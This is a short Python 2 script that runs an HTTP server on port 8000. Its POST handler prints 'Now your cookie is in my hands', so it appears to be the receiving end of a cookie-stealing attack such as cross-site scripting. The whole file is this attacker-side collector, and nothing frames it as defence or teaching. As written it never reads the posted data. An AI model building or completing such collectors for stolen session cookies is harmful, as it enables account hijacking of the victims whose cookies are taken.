import SimpleHTTPServer
import SocketServer

PORT = 8000



SocketServer.TCPServer.allow_reuse_address = True

Handler = SimpleHTTPServer.SimpleHTTPRequestHandler

class StreamerHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
            print( "Hurray!! Now your cookie is in my hands: ")
            self.send_response(200, "OK")



httpd = SocketServer.TCPServer(("", PORT), StreamerHandler)

print "serving at port", PORT
httpd.serve_forever()